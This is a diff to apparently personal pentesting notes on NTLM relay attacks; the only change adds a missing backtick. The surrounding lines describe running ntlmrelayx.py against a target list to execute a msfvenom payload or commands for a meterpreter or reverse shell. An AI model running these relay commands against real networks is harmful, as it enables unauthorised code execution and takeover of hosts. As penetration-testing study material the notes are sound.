@@ -102,7 +102,7 @@
 #### Additionally with ntlmrelayx.py
 
 * we can generate a payload with ***msfvenom*** like ***payload.exe*** as an example and execute it on the target machine and then set up a meterpreter listener in ***metasploit*** and get a shell on the target machine
-* `ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
+* `ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe`
 * or we can execute commands with the ***-c*** option
 * it can be from somehting simple as `ntlmrelayx.py -tf targets.txt -c "whoami"` to a more complex reverse shell or powershell command
 
